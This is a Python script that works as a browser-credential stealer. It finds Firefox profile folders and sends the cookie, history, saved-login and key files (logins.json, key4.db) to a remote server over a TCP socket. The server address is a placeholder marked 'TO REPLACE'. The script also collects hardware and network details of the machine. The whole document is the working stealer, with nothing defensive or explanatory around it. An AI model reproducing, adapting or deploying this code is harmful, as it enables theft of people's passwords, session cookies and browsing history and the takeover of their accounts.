import socket
import os
import psutil

APPDATA_PATH = os.getenv('APPDATA')
FIREFOX_PROFILE_FOLDER = APPDATA_PATH + r"\Mozilla\Firefox\Profiles"

def send_file(filename, server_address, server_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((server_address, server_port))

        client_socket.send(filename.encode())

        with open(filename, 'rb') as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                if client_socket.send(data) == 0:
                    print("File send failed...")

        print("File {} sent successfully.".format(filename))

def enumerate_hardware_info():
    hardware_info = {
        "cpu_count": psutil.cpu_count(logical=False),
        "cpu_count_logical": psutil.cpu_count(logical=True),
        "cpu_freq": psutil.cpu_freq()._asdict(),
        "virtual_memory": psutil.virtual_memory()._asdict(),
        "swap_memory": psutil.swap_memory()._asdict(),
        "disk_partitions": [disk._asdict() for disk in psutil.disk_partitions()],
        "disk_usage": {part.mountpoint: psutil.disk_usage(part.mountpoint)._asdict() for part in psutil.disk_partitions()},
        "network_interfaces": {iface: addrs for iface, addrs in psutil.net_if_addrs().items()},
        "network_stats": psutil.net_if_stats()
    }
    return hardware_info

def main():
    server_address = '127.0.0.1'  # TO REPLACE
    server_port = 4242

    critical_files = ['cookies.sqlite', 'places.sqlite', 'logins.json', 'key4.db']

    profile_folder = os.listdir(FIREFOX_PROFILE_FOLDER)
    for profile in profile_folder:
        profile_path = fr"{FIREFOX_PROFILE_FOLDER}\{profile}"
        files = os.listdir(profile_path)
        if len(files) <= 1:
            continue # folder is not active profile

        for critical_files in critical_files:
            file_path = fr"{profile_path}\{critical_files}"
            if os.path.exists(file_path):
                send_file(file_path, server_address, server_port)

    hardware_info = enumerate_hardware_info()
    print(hardware_info)

if __name__ == "__main__":
    main()
